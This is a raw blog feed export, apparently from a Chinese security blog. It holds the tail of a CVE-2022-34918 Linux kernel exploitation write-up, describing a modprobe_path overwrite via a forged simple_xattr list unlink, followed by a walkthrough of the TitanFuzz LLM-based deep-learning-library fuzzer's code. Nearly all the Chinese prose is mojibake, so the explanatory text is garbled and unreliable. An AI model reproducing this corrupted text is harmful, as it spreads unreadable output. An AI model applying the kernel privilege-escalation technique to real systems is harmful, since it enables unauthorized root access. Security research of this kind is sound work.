b&#x27;/tmp/\xXX\xXX\xff\xffprobe&#x27;</span><br>p-&gt;prev-&gt;next = p-&gt;next;<span class="hljs-comment">// *0xffffxxxx2f706d74 = modprobe_path - 8 + 1</span><br></code></pre></td></tr></table></figure><p>prevæŒ‡é’ˆçš„åˆæ³•åœ°å€ç”±physmapæä¾›ï¼ŒåŠ0xffffxxxx2f706d74æ˜¯ä¸€ä¸ªåˆæ³•çš„physmapåœ°å€</p><h3 id="è¯†åˆ«è¢«è¦†ç›–å¯¹è±¡"><a href="#è¯†åˆ«è¢«è¦†ç›–å¯¹è±¡" class="headerlink" title="è¯†åˆ«è¢«è¦†ç›–å¯¹è±¡"></a>è¯†åˆ«è¢«è¦†ç›–å¯¹è±¡</h3><p>unlinkä¸€ä¸ªsimple_xattræ—¶éœ€è¦ä¸€ä¸ªnameï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦çŸ¥é“å“ªä¸ªç»“æ„ä½“è¢«è¦†ç›–äº†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ†é…0x100å¤§å°çš„nameï¼Œè¿™æ ·nameæŒ‡é’ˆçš„æœ€ä½å­—èŠ‚ä¸º\x00ï¼Œåœ¨ä¼ªé€ listçš„åŒæ—¶è¦†ç›–nameæŒ‡é’ˆçš„ä½å­—èŠ‚æ¥è¯†åˆ«è¦†ç›–å¯¹è±¡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">simple_xattr</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><br><span class="hljs-type">char</span> *name;<br><span class="hljs-type">size_t</span> size;<br><span class="hljs-type">char</span> value[];<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><p>è‡ªå·±æ“äº†ä¸€ä¸ªï¼Œ<em>å¤ªé•¿äº†ä¸è´´äº†</em></p><img src="/2025/01/07/cve-2022-34918/root.png" class title="root">]]></content>
    
    
    <categories>
      
      <category>CVEs</category>
      
      <category>Linux Kernel</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>cve</tag>
      
      <tag>nft</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TitanFuzz</title>
    <link href="/2025/01/03/titanfuzz/"/>
    <url>/2025/01/03/titanfuzz/</url>
    
    <content type="html"><![CDATA[<p>ç»ˆäºå†™å®Œäº†</p><span id="more"></span><h1 id="ev-generation-py"><a href="#ev-generation-py" class="headerlink" title="ev_generation.py"></a>ev_generation.py</h1><p>ä¸»ç¨‹åº</p><h2 id="å‚æ•°"><a href="#å‚æ•°" class="headerlink" title="å‚æ•°"></a>å‚æ•°</h2><ul><li>â€“model_nameï¼šä½¿ç”¨çš„æ¨¡å‹ï¼Œä¸¤ç§ï¼š<ul><li>facebook&#x2F;incoder-1B</li><li>facebook&#x2F;incoder-6B</li></ul></li><li>â€“libraryï¼šæ‰«å“ªä¸ªåº“ï¼š<ul><li>tf</li><li>torch</li></ul></li><li>â€“apiï¼šè¦æ‰«æçš„apiï¼š<ul><li><p>allï¼šå…¨éƒ¨</p></li><li><p>æŒ‡å®šapi</p></li></ul></li><li>â€“apilistï¼šè¦æ‰«æçš„apiçš„æ–‡ä»¶è·¯å¾„ï¼Œå¦‚ï¼š<ul><li>tfï¼šdata&#x2F;tf_apis.txt</li><li>torchï¼šdata&#x2F;torch_apis.txt</li></ul></li><li>â€“startidï¼šä»å‡ å·ç§å­å¼€å§‹ï¼Œé»˜è®¤0</li><li>â€“endidï¼šåˆ°å‡ å·ç§å­ç»“æŸï¼Œé»˜è®¤-1</li><li>â€“folderï¼šå·¥ä½œç›®å½•ï¼Œé»˜è®¤Results&#x2F;${TEST_LIB}</li><li>â€“seedfolderï¼šç§å­åº“è·¯å¾„ï¼Œé»˜è®¤ï¼š<ul><li>tfï¼š..&#x2F;codex_seed_programs&#x2F;codex_tf_seeds&#x2F;fix</li><li>torchï¼š..&#x2F;codex_seed_programs&#x2F;codex_torch_seeds&#x2F;fix</li></ul></li><li>â€“use_sample_apisï¼šæ˜¯å¦ä½¿ç”¨æ ·ä¾‹api<ul><li>æ˜¯<ul><li>tfï¼šdata&#x2F;tf_apis_100sample.txt</li><li>torchï¼šdata&#x2F;torch_apis_100sample.txt</li></ul></li><li>å¦<ul><li>tfï¼šdata&#x2F;tf_apis.txt</li><li>torchï¼šdata&#x2F;torch_apis.txt</li></ul></li></ul></li><li>â€“random_seedï¼šéšæœºæ•°çš„ç§å­</li><li>â€“max_validï¼šæœ€å¤§æœ‰æ•ˆç§å­æ•°</li><li>â€“batch_sizeï¼šä¸€æ¬¡å‰å‘ä¼ æ’­ä¸­åŒæ—¶å¤„ç†çš„æ ·æœ¬æ•°é‡</li><li>â€“timeoutï¼šæ—¶é—´é™åˆ¶</li><li>â€“seed_pool_sizeï¼šç§å­æ± å¤§å°</li><li>â€“only_validï¼šåªä½¿ç”¨å¯ä»¥æˆåŠŸæ‰§è¡Œçš„seed</li><li>â€“relaxargmutï¼šéšæ„æ›¿æ¢argument</li><li>â€“seed_selection_algoï¼šé€‰å–ç§å­çš„æ ‡å‡†ï¼š<ul><li>randomï¼šéšæœºé€‰å–ç§å­</li><li>fitnessï¼šæ ¹æ®fitness scoreé€‰æ‹©ç§å­ï¼Œè¿˜åˆ†ä¸‰ç§ï¼š<ul><li>fitnessï¼šapi callæ•°+æ·±åº¦-é‡å¤æ•°</li><li>fitnessueï¼šapi callæ•°-é‡å¤æ•°</li><li>fitnessudï¼šapi callæ•°+æ·±åº¦</li><li>fitnessdeï¼šæ·±åº¦-é‡å¤æ•°</li></ul></li><li>coverageï¼šæ ¹æ®è¦†ç›–ç‡é€‰æ‹©ç§å­</li></ul></li><li>â€“mutator_selection_algoï¼šå¤šè‡‚èµŒåšæœºç®—æ³•æƒè¡¡ç­–ç•¥<ul><li><p>heuristicï¼šå¯å‘å¼</p></li><li><p>epsgreedyï¼šepsilon-greedyç®—æ³•</p></li><li><p>ucbï¼šUpper Confidence Boundç®—æ³•</p></li><li><p>randomï¼šéšæœºé€‰æ‹©</p></li><li><p>tsï¼šThompson Samplingç®—æ³•</p></li></ul></li><li>â€“use_single_mutatorï¼šåªä½¿ç”¨ä¸€ç§å˜å¼‚æ–¹æ³•</li><li>â€“replace_typeï¼šæ›¿ä»£ç±»å‹<ul><li>argumentï¼šæ›¿æ¢å‚æ•°</li><li>keywordï¼šæ›¿æ¢å…³é”®å­—</li><li>methodï¼šæ›¿æ¢æ–¹æ³•</li><li>prefixï¼šå‰ç¼€æ›¿æ¢å‡ è¡Œ</li><li>prefix-argumentï¼šä¸¤è€…ç»„åˆ</li><li>suffixï¼šåç¼€æ›¿æ¢å‡ è¡Œ</li><li>suffix-argumentï¼šä¸¤è€…ç»„åˆ</li></ul></li><li>â€“mutator_setï¼šå˜å¼‚ç­–ç•¥ï¼ŒåŒ…æ‹¬ä¸åŒçš„replace_typeç­–ç•¥ç»„åˆ<ul><li>allï¼šå…¨éƒ¨</li><li>noprefixï¼šæ— prefix</li><li>nosuffixï¼šæ— suffix</li><li>noargumentï¼šæ— argument</li><li>nomethodï¼šæ— method</li></ul></li><li>â€“validate_modeï¼šç§å­éªŒè¯æ–¹å¼<ul><li>processï¼šä½¿ç”¨processæ‰§è¡ŒéªŒè¯</li><li>multiprocessï¼šä½¿ç”¨æ‰§è¡ŒéªŒè¯</li><li>execï¼šä½¿ç”¨execæ‰§è¡ŒéªŒè¯</li></ul></li><li>â€“close_fd_maskï¼šç”¨flagsçš„å½¢å¼è®¾ç½®æ˜¯å¦å…³é—­stdoutå’Œstderr</li></ul><h2 id="main"><a href="#main" class="headerlink" title="main"></a>main</h2><ul><li><p>å‚æ•°è§£æï¼Œä¸»è¦è¯´æ˜ä¸€ä¸‹â€“api allçš„å¤„ç†ï¼š</p><ul><li><p>â€“apilistä¸ä¸ºç©ºï¼Œåˆ™ä½¿ç”¨apilistï¼Œå¦‚è®¾ç½®äº†startidå’Œendidåˆ™åªå–ç¬¬startidåˆ°ç¬¬endidä¸ªapi</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> args.apilist <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(args.apilist, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        all_apis = f.read().splitlines()<br>    <span class="hljs-keyword">if</span> args.endid != -<span class="hljs-number">1</span>:<br>        all_apis = all_apis[: args.endid]<br>    all_apis = all_apis[args.startid :]<br></code></pre></td></tr></table></figure></li><li><p>â€“apilistä¸ºç©ºï¼š</p><ul><li>è®¾ç½®â€“use_sample_apisï¼š<ul><li>torchï¼šdata&#x2F;torch_apis_100sample.txt</li><li>tfï¼šdata&#x2F;tf_apis_100sample.txt</li></ul></li><li>æœªè®¾ç½®â€“use_sample_apisï¼š<ul><li>torchï¼šdata&#x2F;tf_apis.txt</li><li>tfï¼šdata&#x2F;torch_apis.txt</li></ul></li></ul></li></ul><p>ç„¶åå¯¹äºè·å–çš„æ¯ä¸ªapié‡æ–°è®¾ç½®â€“apiå‚æ•°å†æ¬¡æ‰§è¡Œå‘½ä»¤ï¼Œ<em>éå¸¸æœ´å®æ— å</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> api_idx, api <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(all_apis):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[&#123;&#125; / &#123;&#125;] &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(api_idx, num_apis, api))<br>    <span class="hljs-comment"># æ£€æŸ¥ç§å­æ–‡ä»¶æ˜¯å¦å­˜åœ¨å’Œå·¥ä½œç›®å½•æ˜¯å¦ä¸ä¸ºç©º</span><br>    run_args_api = run_args.copy()<br>    run_args_api[ind] = api<br>    run_cmd(run_args_api, timeout=args.timeout + <span class="hljs-number">50</span>, verbose=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p><em>run_cmdè§util&#x2F;util.py</em></p><p>è¾“å‡ºç¤ºä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">Current directory:  /mnt/workspace/fuzz/TitanFuzz<br>Results will be dumped to:  /mnt/workspace/fuzz/TitanFuzz/Results<br>[0 / 2] tf.nn.conv2d<br>output.returncode:  0<br><span class="hljs-meta prompt_">stdout&gt; </span><span class="language-bash"> Current directory:  /mnt/workspace/fuzz/TitanFuzz</span><br>Results will be dumped to:  /mnt/workspace/fuzz/TitanFuzz/Results<br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">api:  tf.nn.conv2d</span><br></code></pre></td></tr></table></figure></li><li><p>åˆå§‹åŒ–test_executorï¼Œè¿™ä¸ªexecutorç”¨äº</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">mp_executor.init_test_executor(args, cov=(args.seed_selection_algo == <span class="hljs-string">&quot;coverage&quot;</span>))<br></code></pre></td></tr></table></figure><p>åˆå§‹åŒ–ä¸æ˜¯å¦éœ€è¦è®°å½•è¦†ç›–ç‡æœ‰å…³ï¼Œ<em>init_test_executorè§mycoverage&#x2F;mp_executor.py</em></p></li><li><p>åˆå§‹åŒ–SpanLM</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">model = SpanLM(args.model_name, batch_size=args.batch_size)<br></code></pre></td></tr></table></figure><p><em>SpanLMè§model.py</em></p></li><li><p>è®¾ç½®éšæœºæ•°ç§å­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">set_seed(args.random_seed)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_seed</span>(<span class="hljs-params">seed: <span class="hljs-built_in">int</span></span>):<br>    random.seed(seed)<br>    np.random.seed(seed)<br></code></pre></td></tr></table></figure></li><li><p>è¿›å…¥generate</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">generate(args, model)<br></code></pre></td></tr></table></figure></li><li><p>kill executor</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">mp_executor.kill_executors()<br></code></pre></td></tr></table></figure><p><em>æ²¡ä»€ä¹ˆå¥½è§çš„doge</em></p></li></ul><h2 id="generate"><a href="#generate" class="headerlink" title="generate"></a>generate</h2><ul><li><p>å·¥ä½œç›®å½•Results&#x2F;${TEST_LIB}ä¸‹åˆ›å»ºè¿‡ç¨‹ç›®å½•ï¼š</p><ul><li>seedï¼šç§å­</li><li>validï¼šæœ‰æ•ˆ</li><li>flakyï¼šæ‰§è¡Œcrashä½†éªŒè¯æ²¡crash</li><li>hangsï¼šè¶…æ—¶</li><li>crashï¼šcrash</li><li>exceptionï¼šexception</li><li>notargetï¼šæœ‰äº›æ¨ç†çš„outputå¯èƒ½æ²¡æœ‰ç›®æ ‡apiï¼Œæ­¤æ—¶çš„outputå¯ä»¥ä½œä¸ºä¸€ä¸ªæœ‰ç”¨çš„seedæ‰€ä»¥æ”¾åœ¨ä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶å¤¹</li></ul><p>å¹¶å†™äº†ä¸€ä¸ªarg.txtè®°å½•å‚æ•°</p></li><li><p>è·å–åˆå§‹ç§å­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">apis = get_initial_programs(<br>    args.seedfolder, infill_ph, args.library, <span class="hljs-string">&quot;argument&quot;</span>, target_api=args.api<br>)<br></code></pre></td></tr></table></figure><p><em>get_initial_programsè§process_file.py</em></p></li><li><p>å¯¹äºæ¯ä¸ªseedï¼Œæ‰§è¡Œï¼š</p><ul><li><p>è°ƒç”¨validate_statuséªŒè¯ç§å­æ˜¯å¦æœ‰æ•ˆ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">status, msg = validate_status(<br>    seed[<span class="hljs-string">&quot;original&quot;</span>],<br>    args.library,<br>    validate_mode=args.validate_mode,<br>    test_executor=mp_executor.test_executor,<br>)<br></code></pre></td></tr></table></figure><p><em>validate_modeå°±æ˜¯å­—é¢æ„æ€</em>ï¼Œé™¤äº†multiprocessä½¿ç”¨test_executoræ‰§è¡Œ</p></li></ul><p>æœ€åå¾—åˆ°ä¸€ä¸ªseeds_for_generation</p></li><li><p>è¿›å…¥generate_loopï¼š</p><ul><li><p>éœ€è¦è®°å½•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">gen_ret[api] = &#123;&#125;<br>gen_ret[api][<span class="hljs-string">&quot;seeds&quot;</span>] = seeds_for_generation<br>gen_ret[api][<span class="hljs-string">&quot;initials&quot;</span>] = seeds_for_generation<br>(<br>    gen_ret[api][<span class="hljs-string">&quot;outputs&quot;</span>],<br>    gen_ret[api][<span class="hljs-string">&quot;p&quot;</span>],<br>    gen_ret[api][<span class="hljs-string">&quot;crashes&quot;</span>],<br>    gen_ret[api][<span class="hljs-string">&quot;g_time&quot;</span>],<br>    gen_ret[api][<span class="hljs-string">&quot;v_time&quot;</span>],<br>    gen_ret[api][<span class="hljs-string">&quot;tot_time&quot;</span>],<br>    gen_ret[api][<span class="hljs-string">&quot;tot_prog&quot;</span>],<br>) = generate_loop(<br>    args, model, seeds_for_generation, api, logger, args.max_valid<br>)<br></code></pre></td></tr></table></figure><p>gen_retä¼šè¢«è®°å½•åˆ°å·¥ä½œç›®å½•ä¸‹ï¼ˆResults&#x2F;${TEST_LIB}&#x2F;outputs.jsonï¼‰</p></li></ul><p><em>generate_loopè§ev_generation.py</em></p></li><li><p>æŠŠcrashçš„seedè®°å½•è‡³å·¥ä½œç›®å½•ä¸‹ï¼ˆResults&#x2F;${TEST_LIB}ï¼‰</p></li></ul><h2 id="fuzz-loopä¸»è¦æµç¨‹"><a href="#fuzz-loopä¸»è¦æµç¨‹" class="headerlink" title="fuzz loopä¸»è¦æµç¨‹"></a>fuzz loopä¸»è¦æµç¨‹</h2><ul><li>ç§å­é€‰å–ï¼š<ul><li>éšæœºé€‰å–</li><li>æ ¹æ®fitness scoreé€‰å–</li></ul></li><li>å˜å¼‚ç­–ç•¥é€‰å–ï¼šå¤šè‡‚èµŒåšæœºç®—æ³•</li><li>å˜å¼‚ï¼Œç”Ÿæˆä¸€æ‰¹output</li><li>ç§å­æ›´æ–°ï¼š<ul><li>æ ¹æ®è¦†ç›–ç‡é€‰æ‹©ç§å­æ—¶å¦‚æœç§å­æ²¡æœ‰æé«˜è¦†ç›–ç‡åˆ™å°†ç§å­åˆ é™¤</li></ul></li><li>å°†outputåŠ å…¥ç§å­åº“ï¼š<ul><li>å¦‚æœæ ¹æ®fitness scoreé€‰å–ç§å­è¿˜éœ€è¦æ›´æ–°ç§å­åº“çš„å°æ ¹å †</li></ul></li></ul><h2 id="generate-loop"><a href="#generate-loop" class="headerlink" title="generate_loop"></a>generate_loop</h2><ul><li><p>æ ¹æ®self.seed_selection_algoåˆå§‹åŒ–GA_classï¼š</p><ul><li>fitnessï¼šGAR_depth</li><li>randomï¼šGA_Random</li><li>coverageï¼šGA_Coverage</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">ga = GA_class(<br>    original_codes,<br>    num_selection,<br>    args.batch_size,<br>    args.folder,<br>    api,<br>    model.infill_ph,<br>    args.library,<br>    args.relaxargmut,<br>    args.seed_selection_algo,<br>    args.mutator_selection_algo,<br>    args.use_single_mutator,<br>    args.replace_type,<br>    args.seed_pool_size,<br>    args.mutator_set,<br>)<br></code></pre></td></tr></table></figure><p><em>GAR_depthã€GA_Randomã€GA_Coverageè§util&#x2F;Seed_pool.py</em></p></li><li><p>è¿›å…¥fuzzå¤§å¾ªç¯ï¼Œæ¡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">while</span> (max_valid &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> num_valid &lt; max_valid) <span class="hljs-keyword">and</span> <span class="hljs-built_in">sum</span>(<br>    total_run_time<br>) &lt; args.timeout:<br></code></pre></td></tr></table></figure><ul><li><p>é€‰æ‹©ä¸€æ‰¹ç§å­ï¼ˆå…¶å®æ˜¯ä¸€ä¸ªï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">selections = ga.selection()<br><span class="hljs-comment"># â€¦â€¦</span><br><span class="hljs-keyword">for</span> seed, infill_code, replace_type <span class="hljs-keyword">in</span> selections:<br></code></pre></td></tr></table></figure><p><em>selectionè§util&#x2F;Seed_pool.py</em></p><ul><li><p>æ¨ç†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">well, early_stop, outputs = model.model_predict_multi(<br>    infill_code, do_sample=<span class="hljs-literal">True</span>, num_samples=args.batch_size<br>)<br></code></pre></td></tr></table></figure><p><em>model_predict_multiè§model.py</em></p></li><li><p>å¯¹äºæ¯ä¸ªé¢„æµ‹çš„outputï¼š</p><ul><li><p>è°ƒç”¨clean_codeæ¸…ç†ä»£ç </p><p><em>clean_codeè§process_file.py</em></p></li><li><p>è°ƒç”¨dead_code_elimæ¸…é™¤æ­»ä»£ç </p><p><em>dead_code_elimè§util&#x2F;clean_code.py</em></p></li><li><p>è°ƒç”¨SnippetInfillè®¡ç®—num_replaced</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">num_replaced, _, _ = SnippetInfill(<br>    mask_identifier=model.infill_ph,<br>    api_call=api.split(<span class="hljs-string">&quot;.&quot;</span>)[-<span class="hljs-number">1</span>],<br>    prefix=<span class="hljs-string">&quot;.&quot;</span>.join(api.split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]),<br>    library=args.library,<br>    replace_type=<span class="hljs-string">&quot;argument&quot;</span>,<br>).add_infill(output)<br></code></pre></td></tr></table></figure></li></ul><p>â€‹<em>SnippetInfillè§util&#x2F;instrumentor.py</em></p><ul><li><p>è°ƒç”¨validate_statuséªŒè¯outputæœ‰æ•ˆæ€§</p><p><em>validate_statusè§ev_generation.py&#x2F;generate</em></p></li><li><p>å¦‚æœnum_replacedä¸º0å³æ‰€æœ‰ç›®æ ‡apiè¢«é®ç›–ï¼Œåˆ™å°†outputæ”¾å…¥notargetæ–‡ä»¶å¤¹è¿›å…¥ä¸‹ä¸€è½®fuzzå¾ªç¯</p></li><li><p>æ ¹æ®ä¸åŒçš„outputæ‰§è¡Œç»“æœæ”¾å…¥å¯¹åº”æ–‡ä»¶å¤¹</p></li><li><p>SUCCESSï¼švalid</p></li><li><p>TIMEOUTï¼šhangs</p></li><li><p>CRASHï¼šéœ€è¦ç”¨processæ¨¡å¼å†æ¬¡éªŒè¯</p><ul><li>CRASHï¼šcrashï¼Œå¹¶æ”¾å…¥å·¥ä½œç›®å½•ä¸€ä»½</li><li>æ²¡crashï¼šflaskyï¼Œä¹‹å‰çš„crashå¯èƒ½æ˜¯å› ä¸ºæŸäº›ç„å­¦å› ç´ </li></ul></li><li><p>EXCEPTIONï¼šexecption</p></li><li><p>å¦‚æœç§å­é€‰æ‹©æ¨¡å¼ä¸ºcoverageä¸”outputæœ‰æ•ˆè¿˜è¦è°ƒç”¨coverate_run_status_mpæ”¶é›†è¦†ç›–ç‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">status_, new_coverage = mp_executor.coverate_run_status_mp(<br>    output, args.library, cov_executor=mp_executor.cov_executor<br>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&gt; coverage run: &quot;</span>, status_, new_coverage)<br>add_flags.append(new_coverage)<br></code></pre></td></tr></table></figure></li></ul></li><li><p>gaæ›´æ–°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> args.seed_selection_algo == <span class="hljs-string">&quot;coverage&quot;</span>:<br>    ga.update(seed, generations, replace_type, r, filenames, add_flags)<br><span class="hljs-keyword">else</span>:<br>    ga.update(seed, generations, replace_type, r, filenames)<br></code></pre></td></tr></table></figure><p><em>updateè§util&#x2F;Seed_pool.py</em></p></li></ul></li><li><p>log</p><ul><li>Roundï¼šå˜å¼‚è½®æ•°</li><li>New Validï¼šæœ¬è½®ç”Ÿæˆå‡ºçš„æœ‰æ•ˆçš„outputæ•°</li><li>generationï¼šæœ¬è½®å˜å¼‚ç”Ÿæˆç”¨æ—¶</li><li>validationï¼šæœ¬è½®éªŒè¯outputæœ‰æ•ˆæ€§æ€»ç”¨æ—¶</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">--- Round : <span class="hljs-number">21</span> ---<br>--- New Valid : <span class="hljs-number">0</span> using <span class="hljs-number">0.9325060844421387</span>s generation, 0s validation ---<br></code></pre></td></tr></table></figure></li></ul></li><li><p>è°ƒç”¨get_highest_order_outputè·å–æœ€å¤§å˜å¼‚å±‚æ•°å’Œç›¸åº”ç§å­çš„infoï¼Œå¹¶è¾“å‡ºç§å­å†…å®¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">n, highest_order = ga.get_highest_order_output()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">Highest Order: <span class="hljs-number">1</span><br>----- <br> <br>input_data = tf.Variable(np.random.rand(<span class="hljs-number">10</span>, <span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-number">3</span>), dtype=np.float32)<br>filter_data = tf.Variable(np.random.rand(<span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">16</span>), dtype=np.float32)<br>y = tf.nn.conv2d(input_data, filter_data, strides=[<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>], padding=<span class="hljs-string">&#x27;SAME&#x27;</span>)<br> <br> -----<br></code></pre></td></tr></table></figure><p><em>get_highest_order_outputè§util&#x2F;Seed_pool.py</em></p></li><li><p>log</p><ul><li><p>ç”Ÿæˆæœ‰æ•ˆoutputæ€»æ•°ï¼Œç”Ÿæˆæ€»ç”¨æ—¶ï¼ŒéªŒè¯æ€»ç”¨æ—¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">33</span> valid outputs using <span class="hljs-number">44.97628092765808</span>s generation, <span class="hljs-number">16.274909734725952</span>s validation<br></code></pre></td></tr></table></figure></li><li><p>ç”Ÿæˆoutputæ€»æ•°ï¼Œå„ç±»outputæ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">121</span> generated: <span class="hljs-number">46</span> exceptions <span class="hljs-number">39</span> duplicated <span class="hljs-number">0</span> crashes <span class="hljs-number">0</span> timeouts <span class="hljs-number">3</span> notargetd<br></code></pre></td></tr></table></figure></li></ul></li></ul><h1 id="model-py-x2F-class-SpanLM"><a href="#model-py-x2F-class-SpanLM" class="headerlink" title="model.py &#x2F; class SpanLM"></a>model.py &#x2F; class SpanLM</h1><h2 id="init"><a href="#init" class="headerlink" title="__init__"></a>__init__</h2><ul><li><p>load model</p></li><li><p>è·å–tokenizer</p></li><li><p>è®¾ç½®infill_ph</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">self.infill_ph = <span class="hljs-string">&quot;&lt;|mask:&#123;&#125;|&gt;&quot;</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="build-input-multi"><a href="#build-input-multi" class="headerlink" title="build_input_multi"></a>build_input_multi</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_input_multi</span>(<span class="hljs-params">self, infill_code: <span class="hljs-built_in">str</span>, index: <span class="hljs-built_in">int</span>, extra_end: <span class="hljs-built_in">int</span> = <span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">if</span> extra_end != <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> infill_code + <span 